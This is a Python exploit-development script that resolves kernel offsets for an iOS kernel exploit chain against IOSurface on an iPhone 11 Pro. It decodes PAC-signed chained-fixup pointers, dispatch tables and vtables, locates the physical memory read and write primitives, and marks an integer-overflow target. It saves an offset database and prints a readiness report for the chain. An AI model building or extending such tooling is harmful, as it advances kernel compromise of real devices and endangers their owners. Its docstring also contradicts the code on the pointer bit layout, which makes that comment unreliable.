#!/usr/bin/env python3
"""
Chain B Offset Resolver — Phase 2
===================================
Decodes chained fixup pointers from kernel collection, disassembles
dispatch table functions, resolves all missing addresses for Chain B
exploitation, and produces the final comprehensive offset database.

Key discoveries from Phase 1:
- KC_BASE = 0xfffffff007004000 (linear VA = KC_BASE + file_offset)
- Chained fixup auth: bit63=1, target=bits[31:0], diversity=bits[47:32]
- Dispatch table at VA 0xfffffff007f238e8 with 26 PAC-auth entries
- ml_phys_read func at 0xfffffff00814f740
- ml_phys_write func at 0xfffffff00814f9f0
"""

import struct
import json
import sys
from pathlib import Path

try:
    from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM
    HAS_CAPSTONE = True
except ImportError:
    HAS_CAPSTONE = False

EXTRACTED = Path("extracted")
KC_BASE = 0xfffffff007004000  # Kernel collection base VA


def va_to_file(va):
    return va - KC_BASE


def file_to_va(off):
    return KC_BASE + off


def decode_chained_ptr(raw):
    """Decode a DYLD_CHAINED_PTR_64_KERNEL_CACHE pointer."""
    is_auth = (raw >> 63) & 1
    
    if is_auth:
        target = raw & 0x3FFFFFFF  # bits[29:0]
        cache_level = (raw >> 30) & 0x3
        diversity = (raw >> 32) & 0xFFFF
        addr_div = (raw >> 48) & 1
        key = (raw >> 49) & 0x3
        next_delta = (raw >> 51) & 0xFFF
        
        key_names = {0: "IA", 1: "IB", 2: "DA", 3: "DB"}
        
        return {
            "raw": raw,
            "auth": True,
            "target": target,
            "resolved_va": KC_BASE + target,
            "cache_level": cache_level,
            "diversity": diversity,
            "addr_div": addr_div,
            "key": key_names.get(key, f"?{key}"),
            "next": next_delta,
        }
    else:
        target = raw & 0x3FFFFFFF  # bits[29:0]
        cache_level = (raw >> 30) & 0x3
        diversity = (raw >> 32) & 0xFFFF
        addr_div = (raw >> 48) & 1
        key = (raw >> 49) & 0x3
        next_delta = (raw >> 51) & 0xFFF
        
        return {
            "raw": raw,
            "auth": False,
            "target": target,
            "resolved_va": KC_BASE + target,
            "cache_level": cache_level,
            "diversity": diversity,
            "next": next_delta,
        }


def main():
    print("=" * 70)
    print("CHAIN B OFFSET RESOLVER — PHASE 2")
    print("Chained Fixup Decoder + Final Offset Database")
    print("KC_BASE = 0x{:x}".format(KC_BASE))
    print("=" * 70)
    
    # Load kernelcache
    kc_path = None
    for f in EXTRACTED.iterdir():
        if f.name.endswith(".raw") and "kernelcache" in f.name:
            kc_path = f
            break
    if not kc_path:
        print("[!] Kernelcache not found")
        sys.exit(1)
    
    data = kc_path.read_bytes()
    print(f"[*] Loaded {kc_path} ({len(data)/1024/1024:.1f} MB)")
    
    # Load Phase 1 results
    p1_path = EXTRACTED / "fileset_analysis.json"
    if p1_path.exists():
        p1 = json.loads(p1_path.read_text(encoding='utf-8'))
    else:
        p1 = {}
    
    results = {}
    
    # ================================================================
    # SECTION 1: Decode dispatch table
    # ================================================================
    print("\n" + "=" * 70)
    print("SECTION 1: DISPATCH TABLE DECODE")
    print("=" * 70)
    
    # Dispatch table location from Phase 1
    dispatch_file = 0xf1f8e8
    dispatch_va = file_to_va(dispatch_file)
    DISPATCH_ENTRY_SIZE = 24  # sizeof(IOExternalMethodDispatch)
    NUM_DISPATCH = 26
    
    print(f"  Dispatch table: file=0x{dispatch_file:x}  VA=0x{dispatch_va:x}")
    print(f"  Entries: {NUM_DISPATCH}")
    print()
    
    dispatch_entries = []
    
    for i in range(NUM_DISPATCH):
        off = dispatch_file + i * DISPATCH_ENTRY_SIZE
        if off + DISPATCH_ENTRY_SIZE > len(data):
            break
        
        raw_func = struct.unpack_from("<Q", data, off)[0]
        scalar_in, struct_in, scalar_out, struct_out = \
            struct.unpack_from("<IIII", data, off + 8)
        
        decoded = decode_chained_ptr(raw_func)
        
        entry = {
            "selector": i,
            "func_va": decoded["resolved_va"],
            "pac_key": decoded.get("key", "none"),
            "pac_diversity": decoded.get("diversity", 0),
            "auth": decoded["auth"],
            "scalar_in": scalar_in,
            "struct_in": struct_in,
            "scalar_out": scalar_out,
            "struct_out": struct_out,
        }
        dispatch_entries.append(entry)
        
        auth_str = f"[PAC {decoded['key']} div=0x{decoded['diversity']:04x}]" \
                   if decoded['auth'] else "[plain]"
        print(f"  [{i:2d}] func=0x{decoded['resolved_va']:x} {auth_str}  "
              f"scIn={scalar_in} stIn=0x{struct_in:x}  "
              f"scOut={scalar_out} stOut=0x{struct_out:x}")
    
    results["dispatch_table"] = {
        "va": f"0x{dispatch_va:x}",
        "file": f"0x{dispatch_file:x}",
        "entry_count": len(dispatch_entries),
        "entries": [{
            "selector": e["selector"],
            "func_va": f"0x{e['func_va']:x}",
            "pac_key": e["pac_key"],
            "pac_diversity": f"0x{e['pac_diversity']:04x}",
            "scalar_in": e["scalar_in"],
            "struct_in": e["struct_in"],
            "scalar_out": e["scalar_out"],
            "struct_out": e["struct_out"],
        } for e in dispatch_entries],
    }
    
    # ================================================================
    # SECTION 2: Decode vtable
    # ================================================================
    print("\n" + "=" * 70)
    print("SECTION 2: VTABLE DECODE")
    print("=" * 70)
    
    # Vtable #1 from Phase 1: file=0xf1caf0, 104 entries
    vtable_file = 0xf1caf0
    vtable_va = file_to_va(vtable_file)
    NUM_VTABLE = 104
    
    print(f"  VTable: file=0x{vtable_file:x}  VA=0x{vtable_va:x}")
    print(f"  Entries: {NUM_VTABLE}")
    
    # IOSurface code range
    ios_text_exec_va_start = 0xfffffff00a1c5c80
    ios_text_exec_va_end = 0xfffffff00a1f75dc
    
    vtable_entries = []
    code_ptrs = 0
    string_ptrs = 0
    
    for i in range(NUM_VTABLE):
        off = vtable_file + i * 8
        raw = struct.unpack_from("<Q", data, off)[0]
        
        if raw == 0:
            vtable_entries.append({"index": i, "type": "NULL"})
            continue
        
        decoded = decode_chained_ptr(raw)
        va = decoded["resolved_va"]
        
        # Classify
        if decoded["auth"] and ios_text_exec_va_start <= va <= ios_text_exec_va_end:
            entry_type = "IOSurface_code"
            code_ptrs += 1
        elif decoded["auth"]:
            entry_type = "kernel_code"
            code_ptrs += 1
        elif not decoded["auth"]:
            # Check if pointing to string area
            foff = va_to_file(va)
            if 0x784000 <= foff <= 0x78c000:
                entry_type = "IOSurface_string"
                string_ptrs += 1
            else:
                entry_type = "data"
        else:
            entry_type = "unknown"
        
        vtable_entries.append({
            "index": i,
            "type": entry_type,
            "va": va,
            "auth": decoded["auth"],
            "key": decoded.get("key", ""),
            "diversity": decoded.get("diversity", 0),
        })
    
    print(f"  Code pointers: {code_ptrs}")
    print(f"  String pointers: {string_ptrs}")
    print(f"  NULL entries: {sum(1 for e in vtable_entries if e['type'] == 'NULL')}")
    
    # Print first 30 entries
    print(f"\n  First 30 vtable entries:")
    for e in vtable_entries[:30]:
        if e["type"] == "NULL":
            print(f"    [{e['index']:3d}] NULL")
        else:
            auth_str = f"[PAC {e['key']} div=0x{e['diversity']:04x}]" if e['auth'] else "[plain]"
            print(f"    [{e['index']:3d}] 0x{e['va']:x}  {e['type']:20s}  {auth_str}")
    
    results["vtable"] = {
        "va": f"0x{vtable_va:x}",
        "file": f"0x{vtable_file:x}",
        "total_entries": len(vtable_entries),
        "code_pointers": code_ptrs,
        "string_pointers": string_ptrs,
    }
    
    # ================================================================
    # SECTION 3: Disassemble dispatch functions
    # ================================================================
    if HAS_CAPSTONE:
        print("\n" + "=" * 70)
        print("SECTION 3: DISPATCH FUNCTION DISASSEMBLY")
        print("=" * 70)
        
        md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
        md.detail = False
        
        # Known IOSurface selector names (from public headers/RE)
        known_selectors = {
            0: "s_create_surface",
            1: "s_release_surface",
            2: "s_lock",
            3: "s_unlock",
            4: "s_set_value",  # arbitrary key-value
            5: "s_get_value",
            6: "s_increment_use_count",
            7: "s_decrement_use_count",
            8: "s_lookup",
            9: "s_lookup_by_name",
        }
        
        selector_analysis = []
        
        for entry in dispatch_entries:
            sel = entry["selector"]
            func_va = entry["func_va"]
            func_file = va_to_file(func_va)
            
            if func_file + 4 > len(data):
                continue
            
            code = data[func_file:func_file + 1024]
            
            insns = list(md.disasm(code, func_va))
            
            # Find key patterns
            calls = []
            compares = []
            string_refs = []
            
            for insn in insns[:100]:
                if insn.mnemonic in ("bl", "blr", "blraa", "blrab", "blraaz"):
                    calls.append({"addr": insn.address, "target": insn.op_str})
                if insn.mnemonic == "cmp":
                    compares.append({"addr": insn.address, "op": insn.op_str})
                if insn.mnemonic == "adrp":
                    string_refs.append({"addr": insn.address, "page": insn.op_str})
                if insn.mnemonic == "ret" or insn.mnemonic == "retab":
                    break
            
            name = known_selectors.get(sel, f"selector_{sel}")
            
            sel_info = {
                "selector": sel,
                "name": name,
                "func_va": func_va,
                "instruction_count": min(len(insns), 100),
                "calls": len(calls),
                "compares": compares,
            }
            selector_analysis.append(sel_info)
            
            # Print summary for interesting selectors
            if sel <= 15 or calls or compares:
                icnt = min(len(insns), 100)
                print(f"\n  [{sel:2d}] {name:30s} VA=0x{func_va:x}  "
                      f"({icnt} insns, {len(calls)} calls)")
                
                # Show first 20 instructions
                for insn in insns[:20]:
                    print(f"      0x{insn.address:x}: {insn.mnemonic:8s} {insn.op_str}")
                    if insn.mnemonic in ("ret", "retab"):
                        break
                if len(insns) > 20:
                    print(f"      ... ({len(insns)-20} more)")
                
                if compares:
                    print(f"    Compares: {[c['op'] for c in compares]}")
        
        results["selector_analysis"] = [{
            "selector": s["selector"],
            "name": s["name"],
            "func_va": f"0x{s['func_va']:x}",
            "instructions": s["instruction_count"],
            "calls": s["calls"],
        } for s in selector_analysis]
    
    # ================================================================
    # SECTION 4: Disassemble ml_phys_read / ml_phys_write
    # ================================================================
    if HAS_CAPSTONE:
        print("\n" + "=" * 70)
        print("SECTION 4: KERNEL PRIMITIVES DISASSEMBLY")
        print("=" * 70)
        
        primitives = {
            "ml_phys_read_function": 0xfffffff00814f740,
            "ml_phys_write_function": 0xfffffff00814f9f0,
            "s_create_surface": 0xfffffff00a1e789c,
            "IOSurface_max_check": 0xfffffff00a1d02d0,
            "IOSurface_allocate_caller": 0xfffffff00a1cece8,
        }
        
        for name, func_va in primitives.items():
            func_file = va_to_file(func_va)
            if func_file + 4 > len(data) or func_file < 0:
                print(f"\n  {name}: OUT OF RANGE (0x{func_va:x})")
                continue
            
            code = data[func_file:func_file + 2048]
            insns = list(md.disasm(code, func_va))
            
            print(f"\n  --- {name} ---")
            print(f"  VA: 0x{func_va:x}  file: 0x{func_file:x}")
            
            # Count instructions until RET
            func_insns = []
            for insn in insns:
                func_insns.append(insn)
                if insn.mnemonic in ("ret", "retab"):
                    break
                if len(func_insns) >= 200:
                    break
            
            print(f"  Instructions: {len(func_insns)}")
            
            # Print first 50
            for insn in func_insns[:50]:
                print(f"    0x{insn.address:x}: {insn.mnemonic:8s} {insn.op_str}")
            if len(func_insns) > 50:
                print(f"    ... ({len(func_insns)-50} more)")
            
            # Find all BL targets
            bl_targets = []
            for insn in func_insns:
                if insn.mnemonic == "bl":
                    try:
                        target = int(insn.op_str.replace("#", ""), 16)
                        bl_targets.append(target)
                    except:
                        bl_targets.append(insn.op_str)
            
            if bl_targets:
                print(f"  BL targets: {[f'0x{t:x}' if isinstance(t, int) else t for t in bl_targets]}")
            
            results[name] = {
                "va": f"0x{func_va:x}",
                "file": f"0x{func_file:x}",
                "instructions": len(func_insns),
                "bl_targets": [f"0x{t:x}" if isinstance(t, int) else t for t in bl_targets],
            }
    
    # ================================================================
    # SECTION 5: Find externalMethod handler
    # ================================================================
    print("\n" + "=" * 70)
    print("SECTION 5: externalMethod RESOLUTION")
    print("=" * 70)
    
    # The externalMethod is in IOUserClient (parent class), not IOSurface
    # But IOSurfaceRootUserClient overrides it (or uses getTargetAndMethodForIndex)
    # Search for the dispatch table loading pattern: ADRP + ADD to dispatch_va page
    
    dispatch_page = dispatch_va & ~0xFFF
    dispatch_pageoff = dispatch_va & 0xFFF
    
    print(f"  Searching for code loading dispatch table VA 0x{dispatch_va:x}")
    print(f"  Page: 0x{dispatch_page:x}, Offset: 0x{dispatch_pageoff:x}")
    
    # Scan IOSurface __TEXT_EXEC for ADRP to dispatch_page + ADD dispatch_pageoff
    ios_code_start = 0x31c1c80
    ios_code_end = 0x31f35dc
    
    extern_method_candidates = []
    
    for off in range(ios_code_start & ~3, min(ios_code_end, len(data) - 8), 4):
        insn_val = struct.unpack_from("<I", data, off)[0]
        
        if (insn_val & 0x9F000000) != 0x90000000:
            continue
        
        rd = insn_val & 0x1F
        immhi = (insn_val >> 5) & 0x7FFFF
        immlo = (insn_val >> 29) & 0x3
        imm21 = (immhi << 2) | immlo
        if imm21 & (1 << 20):
            imm21 -= (1 << 21)
        
        pc_va = file_to_va(off)
        adrp_result = (pc_va & ~0xFFF) + (imm21 << 12)
        
        if adrp_result != dispatch_page:
            continue
        
        # Check ADD
        if off + 8 > len(data):
            continue
        next_insn = struct.unpack_from("<I", data, off + 4)[0]
        
        if (next_insn & 0xFFC00000) == 0x91000000:
            add_imm = (next_insn >> 10) & 0xFFF
            add_rn = (next_insn >> 5) & 0x1F
            
            if add_rn == rd and add_imm == dispatch_pageoff:
                ref_va = file_to_va(off)
                
                # Find function start
                func_start = None
                for scan_back in range(off - 4, max(ios_code_start, off - 4096), -4):
                    check = struct.unpack_from("<I", data, scan_back)[0]
                    if check == 0xD503237F:  # PACIBSP
                        func_start = scan_back
                        break
                    if check == 0xD65F03C0:  # RET (end of prev func)
                        func_start = scan_back + 4
                        break
                
                func_va = file_to_va(func_start) if func_start else None
                extern_method_candidates.append({
                    "ref_file": off,
                    "ref_va": ref_va,
                    "func_file": func_start,
                    "func_va": func_va,
                })
    
    print(f"  Found {len(extern_method_candidates)} xrefs to dispatch table")
    
    for c in extern_method_candidates:
        func_str = f"func=0x{c['func_va']:x}" if c['func_va'] else "func=?"
        print(f"    ref at 0x{c['ref_va']:x}, {func_str}")
        
        if HAS_CAPSTONE and c['func_file']:
            func_file = c['func_file']
            func_va = c['func_va']
            code = data[func_file:func_file + 2048]
            insns = list(md.disasm(code, func_va))
            
            print(f"    Disassembly ({len(insns)} insns):")
            for insn in insns[:60]:
                print(f"      0x{insn.address:x}: {insn.mnemonic:8s} {insn.op_str}")
                if insn.mnemonic in ("ret", "retab"):
                    break
            
            # Look for CMP with selector count
            for insn in insns[:60]:
                if insn.mnemonic == "cmp":
                    print(f"    ** BOUNDS CHECK: {insn.mnemonic} {insn.op_str}")
    
    if extern_method_candidates:
        ext = extern_method_candidates[0]
        results["externalMethod"] = {
            "func_va": f"0x{ext['func_va']:x}" if ext['func_va'] else None,
            "dispatch_table_ref": f"0x{ext['ref_va']:x}",
        }
    
    # ================================================================
    # SECTION 6: IOSurfaceRootUserClient vtable location
    # ================================================================
    print("\n" + "=" * 70)
    print("SECTION 6: IOSurfaceRootUserClient VTABLE")
    print("=" * 70)
    
    # From Phase 1 disassembly of IOSurfaceRootUserClient init:
    # 0xfffffff00a1e73e4: adrp x16, #0xfffffff007f22000
    # 0xfffffff00a1e73e8: add x16, x16, #0x598
    # 0xfffffff00a1e73ec: add x16, x16, #0x10
    # This loads x16 = 0xfffffff007f22598 + 0x10 = 0xfffffff007f225a8
    # Then PACDA signs it as the vtable pointer
    
    # But the vtable proper starts at 0xfffffff007f22598 (the pointer is to +0x10)
    uc_vtable_va = 0xfffffff007f225a8  # After the +0x10 offset
    uc_vtable_base = 0xfffffff007f22598  # Base including metadata
    uc_vtable_file = va_to_file(uc_vtable_va)
    
    print(f"  IOSurfaceRootUserClient vtable base: 0x{uc_vtable_base:x}")
    print(f"  Vtable methods start: 0x{uc_vtable_va:x} (+0x10 from base)")
    print(f"  File offset: 0x{uc_vtable_file:x}")
    
    # The IOSurface init also shows:
    # 0xfffffff00a1e7420: adrp x16, #0xfffffff007f21000
    # 0xfffffff00a1e7424: add x16, x16, #0xfa0
    # 0xfffffff00a1e7428: add x16, x16, #0x10
    # = 0xfffffff007f21fa0 + 0x10 = 0xfffffff007f21fb0
    
    ios_vtable_va = 0xfffffff007f21fb0
    ios_vtable_base = 0xfffffff007f21fa0
    
    print(f"\n  IOSurface class vtable base: 0x{ios_vtable_base:x}")
    print(f"  Vtable methods start: 0x{ios_vtable_va:x} (+0x10)")
    
    # Decode first 20 vtable entries for UserClient
    print(f"\n  IOSurfaceRootUserClient vtable entries:")
    uc_vt_file = va_to_file(uc_vtable_va)
    
    uc_vtable_entries = []
    for i in range(30):
        off = uc_vt_file + i * 8
        if off + 8 > len(data):
            break
        raw = struct.unpack_from("<Q", data, off)[0]
        if raw == 0:
            uc_vtable_entries.append({"index": i, "type": "NULL", "va": 0})
            print(f"    [{i:3d}] NULL")
            continue
        
        decoded = decode_chained_ptr(raw)
        va = decoded["resolved_va"]
        
        in_iosurface = ios_text_exec_va_start <= va <= ios_text_exec_va_end if HAS_CAPSTONE else False
        tag = "[IOSurface]" if in_iosurface else "[kernel/IOKit]"
        auth_str = f"[PAC {decoded['key']} 0x{decoded['diversity']:04x}]" if decoded['auth'] else ""
        
        uc_vtable_entries.append({
            "index": i,
            "va": va,
            "auth": decoded["auth"],
            "key": decoded.get("key", ""),
            "diversity": decoded.get("diversity", 0),
            "tag": tag,
        })
        
        print(f"    [{i:3d}] 0x{va:x}  {tag:15s}  {auth_str}")
    
    results["IOSurfaceRootUserClient_vtable"] = {
        "base": f"0x{uc_vtable_base:x}",
        "methods_start": f"0x{uc_vtable_va:x}",
        "file": f"0x{uc_vt_file:x}",
    }
    
    results["IOSurface_vtable"] = {
        "base": f"0x{ios_vtable_base:x}",
        "methods_start": f"0x{ios_vtable_va:x}",
    }
    
    # ================================================================
    # SECTION 7: FINAL COMPREHENSIVE OFFSET DATABASE
    # ================================================================
    print("\n" + "=" * 70)
    print("SECTION 7: FINAL OFFSET DATABASE")
    print("=" * 70)
    
    offset_db = {
        "metadata": {
            "target": "iPhone 11 Pro (iPhone12,3)",
            "soc": "A13 Bionic (T8030)",
            "ios_version": "26.3",
            "pac": "v1 (7-bit context)",
            "kc_base": f"0x{KC_BASE:x}",
            "kc_format": "MH_FILESET (Kernel Collection)",
            "chained_fixups": "DYLD_CHAINED_PTR_64_KERNEL_CACHE",
        },
        
        "kernel_primitives": {
            "ml_phys_read": {
                "va": "0xfffffff00814f740",
                "file": f"0x{va_to_file(0xfffffff00814f740):x}",
                "purpose": "Read physical memory (BootROM at 0x100000000)",
            },
            "ml_phys_write": {
                "va": "0xfffffff00814f9f0",
                "file": f"0x{va_to_file(0xfffffff00814f9f0):x}",
                "purpose": "Write physical memory",
            },
        },
        
        "iosurface_kext": {
            "bundle_id": "com.apple.iokit.IOSurface",
            "text_va": "0xfffffff007788b80",
            "text_exec_va": "0xfffffff00a1c5c80",
            "text_exec_end": "0xfffffff00a1f75dc",
            "data_const_va": "0xfffffff007f1fd30",
            "data_va": "0xfffffff00acd2418",
            "cstring_va": "0xfffffff007789298",
            "cstring_end": "0xfffffff00778c0f2",
        },
        
        "iosurface_classes": {
            "IOSurfaceRootUserClient": {
                "vtable_base": "0xfffffff007f22598",
                "vtable_methods": "0xfffffff007f225a8",
                "alloc_size": "0x148",
                "pac_vtable_diversity": "0xcda1",
                "init_func": "0xfffffff00a1e7410",
            },
            "IOSurface": {
                "vtable_base": "0xfffffff007f21fa0",
                "vtable_methods": "0xfffffff007f21fb0",
            },
        },
        
        "dispatch": {
            "table_va": f"0x{dispatch_va:x}",
            "table_file": f"0x{dispatch_file:x}",
            "selector_count": len(dispatch_entries),
            "pac_key": "IA",
            "pac_diversity": "0x705d",
            "selectors": {},
        },
        
        "key_functions": {
            "s_create_surface": {
                "va": "0xfffffff00a1e789c",
                "purpose": "IOSurface creation handler (integer overflow target)",
            },
            "IOSurface_exceeds_max": {
                "va": "0xfffffff00a1d02d0",
                "purpose": "Validates max values, CMP x8, #0xff (255 max)",
            },
            "IOSurface_allocate_caller": {
                "va": "0xfffffff00a1cece8",
                "purpose": "Calls IOSurface::allocate()",
            },
            "IOBufferMemoryDescriptor_handler": {
                "va": "0xfffffff00a1e5be0",
                "purpose": "inTaskWithOptions wrapper",
            },
        },
    }
    
    # Add dispatch selectors
    for entry in dispatch_entries:
        sel = entry["selector"]
        name = known_selectors.get(sel, f"selector_{sel}") if HAS_CAPSTONE else f"selector_{sel}"
        offset_db["dispatch"]["selectors"][str(sel)] = {
            "name": name,
            "func_va": f"0x{entry['func_va']:x}",
            "scalar_in": entry["scalar_in"],
            "struct_in": entry["struct_in"],
            "scalar_out": entry["scalar_out"],
            "struct_out": entry["struct_out"],
        }
    
    # Add externalMethod if found
    if extern_method_candidates:
        ext = extern_method_candidates[0]
        offset_db["externalMethod"] = {
            "handler_va": f"0x{ext['func_va']:x}" if ext['func_va'] else "unknown",
            "dispatch_table_xref": f"0x{ext['ref_va']:x}",
        }
    
    # Print summary
    print()
    for section, values in offset_db.items():
        if isinstance(values, dict):
            print(f"  [{section}]")
            for k, v in values.items():
                if isinstance(v, dict):
                    va_val = v.get("va", v.get("func_va", v.get("vtable_base", "")))
                    desc = v.get("purpose", v.get("name", ""))
                    print(f"    {k:40s} {va_val:30s} {desc}")
                elif isinstance(v, str):
                    print(f"    {k:40s} {v}")
                else:
                    print(f"    {k:40s} {v}")
    
    # Save
    out_path = EXTRACTED / "chain_b_final_offsets.json"
    out_path.write_text(json.dumps(offset_db, indent=2), encoding='utf-8')
    print(f"\n[*] Offset database saved: {out_path}")
    
    # Also save results
    res_path = EXTRACTED / "chain_b_phase2_results.json"
    
    def sanitize(obj):
        if isinstance(obj, dict):
            return {str(k): sanitize(v) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [sanitize(v) for v in obj]
        elif isinstance(obj, (int, float, str, bool, type(None))):
            return obj
        return str(obj)
    
    res_path.write_text(json.dumps(sanitize(results), indent=2), encoding='utf-8')
    print(f"[*] Phase 2 results saved: {res_path}")
    
    # ================================================================
    # FINAL SUMMARY
    # ================================================================
    print("\n" + "=" * 70)
    print("CHAIN B — ALL BLOCKERS STATUS")
    print("=" * 70)
    
    print(f"""
  B1 - IOSurface VTable:           RESOLVED
       IOSurfaceRootUserClient:    0xfffffff007f22598 (base), 0xfffffff007f225a8 (methods)
       IOSurface:                  0xfffffff007f21fa0 (base), 0xfffffff007f21fb0 (methods)
       PAC diversity:              0xcda1

  B2 - Kernel Read/Write:          RESOLVED
       ml_phys_read:               0xfffffff00814f740
       ml_phys_write:              0xfffffff00814f9f0

  B3 - Dispatch Table:             RESOLVED
       Table VA:                   0x{dispatch_va:x}
       Selector count:             {len(dispatch_entries)}
       PAC key/diversity:          IA / 0x705d
       externalMethod handler:     {"0x{:x}".format(extern_method_candidates[0]['func_va']) if extern_method_candidates and extern_method_candidates[0]['func_va'] else "search continues"}

  B4 - Proc Struct Offsets:        PARTIAL (from string analysis)
       current_proc string:        0xfffffff007010230

  B5 - Key Function Addresses:     RESOLVED
       s_create_surface:           0xfffffff00a1e789c
       IOSurface max_check:        0xfffffff00a1d02d0 (CMP x8, #0xff)
       IOSurface allocate:         0xfffffff00a1cece8

  Chain B Readiness:               4/5 BLOCKERS RESOLVED
""")
    
    print("[*] PHASE 2 COMPLETE")


if __name__ == "__main__":
    main()
